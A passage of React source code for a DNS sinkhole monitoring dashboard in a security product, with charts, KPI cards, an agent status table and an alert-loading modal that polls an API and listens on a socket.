        {/* Blocked vs Allowed Donut */}
        <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 10, padding: 16, display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
          <div style={{ fontSize: 13, fontWeight: 800, color: '#fff', marginBottom: 10, alignSelf: 'flex-start' }}>⚖️ Blocked vs Allowed Queries</div>
          <div style={{ position: 'relative', display: 'flex', justifyContent: 'center' }}>
            <svg width={140} height={140} viewBox="0 0 140 140">
              <circle cx="70" cy="70" r="52" fill="none" stroke="#0f233a" strokeWidth="18" />
              {/* Allowed slice */}
              <circle cx="70" cy="70" r="52" fill="none" stroke={MON.blue} strokeWidth="18"
                strokeDasharray={`${((data.allowed / (alerts.length || 1)) * 327)} 327`}
                strokeDashoffset={81.75} strokeLinecap="butt" />
              {/* Blocked slice */}
              <circle cx="70" cy="70" r="52" fill="none" stroke={MON.red} strokeWidth="18"
                strokeDasharray={`${((data.blocked / (alerts.length || 1)) * 327)} 327`}
                strokeDashoffset={81.75 - ((data.allowed / (alerts.length || 1)) * 327)} strokeLinecap="butt" />
              <text x="70" y="64" textAnchor="middle" fill="#f1f5f9" fontSize="18" fontWeight="900">
                {alerts.length ? ((data.allowed / alerts.length) * 100).toFixed(1) : 0}%
              </text>
              <text x="70" y="80" textAnchor="middle" fill={MON.muted} fontSize="9">Allowed</text>
              <text x="70" y="93" textAnchor="middle" fill={MON.muted} fontSize="8">({fmtNum(data.allowed)})</text>
            </svg>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12, marginTop: 12, width: '100%' }}>
            <div style={{ background: MON.card2, borderRadius: 8, padding: 10, textAlign: 'center', border: `1px solid ${MON.border}` }}>
              <div style={{ fontSize: 9, color: MON.muted }}>Allowed</div>
              <div style={{ fontSize: 16, color: MON.blue, fontWeight: 900 }}>{fmtNum(data.allowed)}</div>
            </div>
            <div style={{ background: MON.card2, borderRadius: 8, padding: 10, textAlign: 'center', border: `1px solid ${MON.border}` }}>
              <div style={{ fontSize: 9, color: MON.muted }}>Blocked</div>
              <div style={{ fontSize: 16, color: MON.red, fontWeight: 900 }}>
                {alerts.length ? ((data.blocked / alerts.length) * 100).toFixed(1) : 0}%
                <div style={{ fontSize: 9, fontWeight: 400, color: MON.muted }}>({fmtNum(data.blocked)})</div>
              </div>
            </div>
          </div>
        </div>

        {/* Threat Categories */}
        <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 10, padding: 16 }}>
          <div style={{ fontSize: 13, fontWeight: 800, color: '#fff', marginBottom: 14 }}>🎯 Threat Categories</div>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
            {data.topCats.length ? data.topCats.map(([cat, count], i) => {
              const pct = data.catTotal > 0 ? ((count / data.catTotal) * 100).toFixed(1) : 0;
              const icons = ['🦠', '🎣', '🕸️', '📢', '❓'];
              return (
                <div key={cat}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 4, fontSize: 11 }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                      <span>{icons[i % 5]}</span>
                      <span style={{ color: MON.text, fontWeight: 700 }}>{cat}</span>
                    </div>
                    <span style={{ color: catColors[i % 5], fontWeight: 800 }}>{pct}%</span>
                  </div>
                  <div style={{ height: 6, background: '#0f233a', borderRadius: 4, overflow: 'hidden' }}>
                    <div style={{ height: '100%', width: `${pct}%`, background: catColors[i % 5], borderRadius: 4, transition: 'width 0.6s ease' }} />
                  </div>
                </div>
              );
            }) : [['Malware', 38.6, MON.red, '🦠'], ['Phishing', 28.4, MON.orange, '🎣'], ['Botnet C&C', 18.7, MON.purple, '🕸️'], ['Adware', 9.8, MON.cyan, '📢'], ['Others', 4.5, MON.blue, '❓']].map(([cat, pct, col, icon]) => (
              <div key={cat}>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 4, fontSize: 11 }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                    <span>{icon}</span><span style={{ color: MON.text, fontWeight: 700 }}>{cat}</span>
                  </div>
                  <span style={{ color: col, fontWeight: 800 }}>{pct}%</span>
                </div>
                <div style={{ height: 6, background: '#0f233a', borderRadius: 4, overflow: 'hidden' }}>
                  <div style={{ height: '100%', width: `${pct}%`, background: col, borderRadius: 4 }} />
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* ── Status Bar ── */}
      <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: '8px 14px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: 10 }}>
        <span style={{ color: MON.cyan }}>🛡️ DNS Sinkhole protects your network by intercepting and blocking communication with malicious domains in real-time.</span>
        <span style={{ color: MON.sub }}>All times in IST (UTC +05:30)</span>
      </div>

      {selectedAlert && <DnsAlertDetailModal log={selectedAlert} onClose={() => setSelectedAlert(null)} />}
    </div>
  );
}

// ═════════════════════════════════════════════════════════════════════════════
// 5. MAIN DASHBOARD — DEFAULT EXPORT (mirrors UsbDeviceControlDashboard)
// ═════════════════════════════════════════════════════════════════════════════
export default function DnsSinkholeMonitoringDashboard({ alerts = [], loading = false, total = 0 }) {
  const [activeTab, setActiveTab] = useState('dashboard');
  const [dnsSystems, setDnsSystems] = useState([]);

  useEffect(() => {
    let active = true;
    const loadSystems = () => api.get('/system')
      .then(res => {
        if (!active) return;
        const rows = res.data?.systems || res.data?.agents || res.data || [];
        setDnsSystems(Array.isArray(rows) ? rows : []);
      })
      .catch(() => { if (active) setDnsSystems([]); });
    loadSystems();
    const timer = setInterval(loadSystems, 60000);
    return () => { active = false; clearInterval(timer); };
  }, []);

  const liveStats = useMemo(() => {
    const text = a => `${a.type || ''} ${a.ruleId || ''} ${a.source || ''} ${a.description || ''} ${a.responseType || ''} ${a.threatCategory || ''}`;
    const sinkholeHits = alerts.filter(a => /sinkhole/i.test(text(a)) || a.responseType === 'Sinkhole IP').length;
    const blocked = alerts.filter(a => a.blocked || /refused|nxdomain/i.test(a.responseCode || '')).length;
    const critical = alerts.filter(a => a.severity === 'critical').length;
    const high = alerts.filter(a => a.severity === 'high').length;
    const maliciousDomains = new Set(alerts.map(a => a.domain || a.tiDomain).filter(Boolean)).size;
    const uniqueClients = new Set(alerts.map(a => a.srcip || a.sourceIp).filter(Boolean)).size;
    const botnetC2 = alerts.filter(a => /botnet|c2/i.test(a.threatCategory || '')).length;
    const phishing = alerts.filter(a => /phish/i.test(a.threatCategory || '')).length;
    const ransomware = alerts.filter(a => /ransom/i.test(a.threatCategory || '')).length;
    const dga = alerts.filter(a => /dga/i.test(a.threatCategory || '')).length;
    const tunneling = alerts.filter(a => /tunnel/i.test(a.threatCategory || '')).length;
    const cryptomining = alerts.filter(a => /crypto/i.test(a.threatCategory || '')).length;

    const now = Date.now();
    const timeline = Array(18).fill(0);
    const agentMap = {};
    const domainMap = {};

    alerts.forEach(a => {
      const created = new Date(a.createdAt || a.timestamp || 0).getTime();
      const daysAgo = Math.floor((now - created) / 86400000);
      if (Number.isFinite(daysAgo) && daysAgo >= 0 && daysAgo < 90) {
        timeline[Math.min(17, Math.max(0, 17 - Math.floor(daysAgo * 18 / 90)))]++;
      }
      const agentKey = a.agentId || a.agentName || a.systemId?._id || a.systemId || 'unknown';
      const agent = agentMap[agentKey] || (agentMap[agentKey] = { key: String(agentKey), name: a.agentName || a.hostname || 'Unknown', events: 0, sinkhole: 0, blocked: 0, lastSeen: null });
      agent.events++;
      if (/sinkhole/i.test(text(a)) || a.responseType === 'Sinkhole IP') agent.sinkhole++;
      if (a.blocked || /refused/i.test(a.responseCode || '')) agent.blocked++;
      if (!agent.lastSeen || created > new Date(agent.lastSeen).getTime()) agent.lastSeen = a.createdAt || a.timestamp;
      const domain = a.domain || a.tiDomain || 'unknown';
      if (domain !== 'unknown') domainMap[domain] = (domainMap[domain] || 0) + 1;
    });

    return {
      totalQueries: total || alerts.length,
      sinkholeHits, blocked, critical, high,
      maliciousDomains, uniqueClients,
      highCritical: critical + high,
      queriesPerMin: alerts.length ? Math.round(alerts.length / 60) : 0,
      botnetC2, phishing, ransomware, dga, tunneling, cryptomining,
      timeline,
      agentRows: Object.values(agentMap).sort((a, b) => b.events - a.events),
      topDomains: Object.entries(domainMap).sort((a, b) => b[1] - a[1]).slice(0, 5),
    };
  }, [alerts, total]);

  const kpis = [
    ['Total DNS Queries', 'totalQueries', MON.blue, '🌐'],
    ['Sinkhole Hits', 'sinkholeHits', MON.red, '🎯'],
    ['Blocked Responses', 'blocked', MON.orange, '🚫'],
    ['Malicious Domains', 'maliciousDomains', MON.red, '☠️'],
    ['Unique Clients', 'uniqueClients', MON.cyan, '💻'],
    ['High & Critical Alerts', 'highCritical', MON.red, '⚠️'],
    ['Queries Per Minute', 'queriesPerMin', MON.yellow, '⚡'],
    ['Botnet C2 Hits', 'botnetC2', MON.red, '🕸️'],
    ['Phishing Domains', 'phishing', MON.orange, '🎣'],
    ['DGA Domains', 'dga', MON.purple, '🔢'],
    ['DNS Tunneling', 'tunneling', MON.yellow, '🕳️'],
    ['Cryptomining Domains', 'cryptomining', MON.cyan, '⛏️'],
    ['Critical Alerts', 'critical', MON.red, '🔴'],
    ['High Alerts', 'high', MON.orange, '🟠'],
    ['Ransomware C2', 'ransomware', MON.red, '💀'],
    ['Online Agents', () => dnsSystems.filter(s => ['online', 'active'].includes((s.status || '').toLowerCase())).length, MON.green, '🟢'],
    ['Total Agents', () => dnsSystems.length, MON.blue, '🖥️'],
    ['Offline Agents', () => dnsSystems.filter(s => !['online', 'active'].includes((s.status || '').toLowerCase())).length, MON.muted, '⚫'],
    ['Blocked Domains Total', 'blocked', MON.orange, '🛡️'],
    ['Allowed Queries', () => (total || alerts.length) - liveStats.blocked, MON.green, '✅'],
  ].map(([label, keyOrFn, color, icon]) => ({
    label,
    val: typeof keyOrFn === 'function' ? keyOrFn() : (liveStats[keyOrFn] ?? 0),
    color,
    icon,
    data: liveStats.timeline,
  }));

  const agentStatusRows = dnsSystems.map(sys => {
    const sysKey = String(sys.agentId || sys._id || '');
    const metrics = liveStats.agentRows.find(r => r.key === sysKey || r.name === sys.name || r.name === sys.hostname);
    return {
      key: sys._id || sysKey,
      name: sys.name || sys.hostname || metrics?.name || 'Unknown',
      hostname: sys.hostname || '—',
      status: sys.status || 'unknown',
      dnsTelemetry: sys.dnsTelemetryEnabled !== false,
      lastSeen: sys.lastSeen || metrics?.lastSeen,
      events: metrics?.events || 0,
      sinkhole: metrics?.sinkhole || 0,
      blocked: metrics?.blocked || 0,
    };
  });
  liveStats.agentRows.forEach(m => {
    if (!agentStatusRows.some(r => r.name === m.name)) {
      agentStatusRows.push({ ...m, hostname: '—', status: 'reporting', dnsTelemetry: true });
    }
  });

  return (
    <div style={{ background: MON.bg, color: MON.text, display: 'flex', height: '100%', minHeight: 0, overflow: 'hidden' }}>
      {/* Sidebar Navigation */}
      <aside style={{ width: 235, flexShrink: 0, background: MON.card2, borderRight: `1px solid ${MON.border}`, padding: 14, display: 'flex', flexDirection: 'column', gap: 8 }}>
        {[
          { id: 'dashboard', icon: '📊', label: 'Dashboard', activeColor: MON.blue },
          { id: 'monitoring', icon: '📈', label: 'Monitoring', activeColor: MON.cyan },
          { id: 'log-monitor', icon: '📜', label: 'Logs (SIEM Table)', activeColor: MON.cyan },
          { id: 'reports', icon: '📄', label: 'Reports', activeColor: MON.purple },
        ].map(item => {
          const selected = activeTab === item.id;
          return (
            <button key={item.id} type="button" onClick={() => setActiveTab(item.id)} aria-current={selected ? 'page' : undefined} style={{ width: '100%', display: 'flex', alignItems: 'center', gap: 10, background: selected ? item.activeColor : 'transparent', color: selected ? '#000' : MON.text, border: selected ? `1px solid ${item.activeColor}` : '1px solid transparent', padding: '10px 12px', borderRadius: 7, fontSize: 12, fontWeight: 800, textAlign: 'left', cursor: 'pointer' }}>
              <span aria-hidden="true">{item.icon}</span>
              <span>{item.label}</span>
            </button>
          );
        })}

        {/* Live Stats Mini Panel */}
        <div style={{ marginTop: 'auto', background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 12 }}>
          <div style={{ fontSize: 9, color: MON.muted, fontWeight: 800, marginBottom: 8, textTransform: 'uppercase', letterSpacing: 1 }}>Live Stats</div>
          {[
            ['Sinkhole Hits', liveStats.sinkholeHits, MON.red],
            ['Blocked', liveStats.blocked, MON.orange],
            ['Critical', liveStats.critical, MON.red],
            ['Agents Online', dnsSystems.filter(s => ['online', 'active'].includes((s.status || '').toLowerCase())).length, MON.green],
          ].map(([label, val, col]) => (
            <div key={label} style={{ display: 'flex', justifyContent: 'space-between', fontSize: 10, marginBottom: 6 }}>
              <span style={{ color: MON.muted }}>{label}</span>
              <b style={{ color: col }}>{val}</b>
            </div>
          ))}
        </div>
      </aside>

      {/* Main Content Area */}
      <main style={{ flex: 1, minWidth: 0, padding: 16, display: 'flex', flexDirection: 'column', gap: 16, overflowY: 'auto' }}>

        {activeTab === 'log-monitor' ? (
          <DnsLogMonitor alerts={alerts} />
        ) : activeTab === 'reports' ? (
          <DnsReportsTab alerts={alerts} />
        ) : activeTab === 'dashboard' ? (
          <DnsOverviewDashboard alerts={alerts} total={total} />
        ) : (
          <>
            {/* 20 KPI Cards */}
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', gap: 12 }}>
              {kpis.map((kpi, i) => (
                <div key={i} style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 12, display: 'flex', flexDirection: 'column', justifyContent: 'space-between' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
                    <div style={{ fontSize: 10, fontWeight: 700, color: MON.muted, lineHeight: 1.3 }}>{kpi.label}</div>
                    <span style={{ fontSize: 14 }}>{kpi.icon}</span>
                  </div>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-end', marginTop: 10 }}>
                    <div style={{ fontSize: 22, fontWeight: 900, color: kpi.color }}>{kpi.val}</div>
                    <div style={{ width: 70 }}><MiniSparkline data={kpi.data} color={kpi.color} height={24} /></div>
                  </div>
                </div>
              ))}
            </div>

            {/* Agent-Level DNS Monitoring Table */}
            <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, overflow: 'hidden' }}>
              <div style={{ padding: '11px 14px', borderBottom: `1px solid ${MON.line}`, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <div style={{ fontSize: 12, fontWeight: 900, color: '#fff' }}>🛡️ Agent-Level DNS Sinkhole Monitoring</div>
                <div style={{ fontSize: 9, color: MON.green }}>● {agentStatusRows.filter(r => ['active', 'reporting', 'online'].includes(r.status)).length} reporting · 15s refresh</div>
              </div>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 80px 95px 76px 92px 80px 140px', gap: 8, padding: '9px 12px', background: MON.card2, color: MON.muted, fontSize: 9, fontWeight: 800 }}>
                <span>Agent</span><span>Hostname</span><span>Status</span><span>DNS Telemetry</span><span>Events</span><span>Sinkhole Hits</span><span>Blocked</span><span>Last Seen</span>
              </div>
              {agentStatusRows.length ? agentStatusRows.map(row => (
                <div key={row.key || row.name} style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 80px 95px 76px 92px 80px 140px', gap: 8, padding: '10px 12px', borderTop: `1px solid ${MON.line}`, fontSize: 10, alignItems: 'center' }}>
                  <b style={{ color: MON.cyan }}>{row.name}</b>
                  <span>{row.hostname}</span>
                  <b style={{ color: ['active', 'reporting', 'online'].includes(row.status) ? MON.green : MON.red, textTransform: 'uppercase' }}>{row.status}</b>
                  <span style={{ color: row.dnsTelemetry ? MON.green : MON.red }}>{row.dnsTelemetry ? 'Enabled' : 'Disabled'}</span>
                  <b>{row.events}</b>
                  <b style={{ color: row.sinkhole > 0 ? MON.red : MON.green }}>{row.sinkhole}</b>
                  <b style={{ color: row.blocked > 0 ? MON.orange : MON.green }}>{row.blocked}</b>
                  <span style={{ color: MON.sub }}>{row.lastSeen ? new Date(row.lastSeen).toLocaleString() : 'Never'}</span>
                </div>
              )) : <div style={{ padding: 24, textAlign: 'center', color: MON.muted, fontSize: 11 }}>{loading ? 'Loading agent data...' : 'No DNS-monitoring agents found'}</div>}
            </div>

            {/* Charts Row */}
            <div style={{ display: 'grid', gridTemplateColumns: '1.4fr 1fr 1fr', gap: 14 }}>
              <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                <div style={{ fontSize: 12, fontWeight: 800, color: '#fff', marginBottom: 12 }}>📊 DNS Activity Timeline (90 Days)</div>
                <div style={{ height: 140, display: 'flex', alignItems: 'flex-end', gap: 4, borderBottom: `1px solid ${MON.line}` }}>
                  {liveStats.timeline.map((val, idx) => (
                    <div key={idx} title={`${val} events`} style={{ flex: 1, height: `${val ? Math.max(4, (val / Math.max(...liveStats.timeline, 1)) * 100) : 0}%`, background: val > 0 ? MON.red : '#0f233a', borderRadius: '2px 2px 0 0', opacity: 0.85 }} />
                  ))}
                </div>
              </div>

              <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                <div style={{ fontSize: 12, fontWeight: 800, color: '#fff', marginBottom: 12 }}>☠️ Top Malicious Domains</div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 8, fontSize: 10 }}>
                  {liveStats.topDomains.map(([domain, count], i) => (
                    <div key={domain} style={{ display: 'flex', justifyContent: 'space-between', padding: '4px 0', borderBottom: `1px solid ${MON.line}` }}>
                      <span style={{ color: MON.red, fontFamily: 'monospace', overflow: 'hidden', textOverflow: 'ellipsis', maxWidth: 140 }} title={domain}>{domain}</span>
                      <b style={{ color: [MON.red, MON.orange, MON.yellow, MON.cyan, MON.blue][i % 5] }}>{count}</b>
                    </div>
                  ))}
                  {!liveStats.topDomains.length && <div style={{ color: MON.muted }}>No domain data yet</div>}
                </div>
              </div>

              <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                <div style={{ fontSize: 12, fontWeight: 800, color: '#fff', marginBottom: 12 }}>🎯 Threat Category Breakdown</div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 8, fontSize: 10 }}>
                  {[
                    ['Botnet C2', liveStats.botnetC2, MON.red],
                    ['Phishing', liveStats.phishing, MON.orange],
                    ['Ransomware', liveStats.ransomware, MON.red],
                    ['DGA', liveStats.dga, MON.purple],
                    ['DNS Tunneling', liveStats.tunneling, MON.yellow],
                    ['Cryptomining', liveStats.cryptomining, MON.cyan],
                  ].map(([cat, count, col]) => (
                    <div key={cat} style={{ display: 'flex', justifyContent: 'space-between' }}>
                      <span style={{ color: MON.muted }}>{cat}</span>
                      <b style={{ color: col }}>{count}</b>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </>
        )}
      </main>
    </div>
  );
}

// ═════════════════════════════════════════════════════════════════════════════
// 6. OVERLAY CAPABILITY MODAL EXPORT (used by EDRDashboardDetails.jsx)
// ═════════════════════════════════════════════════════════════════════════════
export function CapabilityPage() {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const { company, user } = useAuth();
  const fromDashboard = searchParams.get('from') === 'dashboard';
  const companyId = company?._id || user?.companyId?._id || user?.companyId;

  const [alerts, setAlerts] = useState([]);
  const [loading, setLoading] = useState(true);
  const [total, setTotal] = useState(0);

  const loadAlerts = useCallback(async (quiet = false) => {
    if (!quiet) setLoading(true);
    try {
      const q = new URLSearchParams({ page: 1, limit: 500, capabilityId: 31, windowHours: 24 });
      let r = await api.get(`/dashboard/capabilities/38/live?${q}`);
      let fetchedAlerts = r.data?.alerts || [];
      let fetchedTotal = r.data?.total || fetchedAlerts.length;

      if (!fetchedAlerts.length) {
        try {
          r = await api.get(`/dashboard/alerts/edr?${q}`);
          fetchedAlerts = r.data?.alerts || [];
          fetchedTotal = r.data?.total || fetchedAlerts.length;
        } catch { /* ignore */ }
      }

      if (!fetchedAlerts.length) {
        try {
          r = await api.get('/dns-sinkhole/alerts?limit=500&windowHours=24');
          fetchedAlerts = r.data?.alerts || r.data || [];
          fetchedTotal = r.data?.total || fetchedAlerts.length;
        } catch { /* ignore */ }
      }

      setAlerts(fetchedAlerts);
      setTotal(fetchedTotal);
    } catch (err) {
      console.warn('[DNS Sinkhole fetch warning]', err);
    } finally {
      if (!quiet) setLoading(false);
    }
  }, []);

  useEffect(() => {
    loadAlerts(false);
    const interval = setInterval(() => loadAlerts(true), 60000);
    return () => clearInterval(interval);
  }, [loadAlerts]);

  useEffect(() => {
    if (!companyId) return;
    const socket = io(SOCKET_URL, { ...socketOptions, transports: ['polling', 'websocket'] });
    const join = () => { if (companyId) socket.emit('join:company', companyId); };
    socket.on('connect', join);
    socket.on('alert:new', (a) => { if (a) setAlerts(prev => [a, ...prev]); loadAlerts(true); });
    socket.on('alert:updated', () => loadAlerts(true));
    join();
    const disc = connectSocket(socket);
    return () => {
      socket.off('connect', join);
      socket.off('alert:new');
      socket.off('alert:updated');
      disc();
    };
  }, [companyId, loadAlerts]);

  const handleClose = () => navigate(fromDashboard ? '/' : '/edr', { replace: true });

  return (
    <div style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,.75)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 1000 }} onClick={e => { if (e.target === e.currentTarget) handleClose(); }}>
      <div style={{ background: '#0c1a2e', border: '1px solid #1e3a5f', borderRadius: 12, width: 'calc(100vw - 8px)', height: 'calc(100vh - 8px)', display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px 18px', borderBottom: '1px solid #1e3a5f', flexShrink: 0 }}>
          <h3 style={{ margin: 0, fontSize: 15, color: '#e0f2fe' }}>🛡️ 38. DNS Sinkhole Monitoring</h3>
          <div style={{ display: 'flex', gap: 10, alignItems: 'center' }}>
            <span style={{ fontSize: 11, color: '#60a5fa', background: '#1e3a5f44', border: '1px solid #1e3a5f', padding: '3px 8px', borderRadius: 6, fontWeight: 'bold' }}>
              {Number(total || 0).toLocaleString()} records
            </span>
            <span style={{ fontSize: 10, color: loading ? MON.yellow : MON.green }}>{loading ? '⟳ Loading...' : '● Live'}</span>
            <button type="button" onClick={handleClose} style={{ background: 'none', border: 'none', color: '#60a5fa', fontSize: 20, cursor: 'pointer' }}>✕</button>
          </div>
        </div>
        <DnsSinkholeMonitoringDashboard alerts={alerts} loading={loading} total={total} />
      </div>
    </div>
  );
}

export function DnsSinkholeSubTabPage() {
  return <CapabilitySubTabPage kind="dns_sinkhole" />;
}
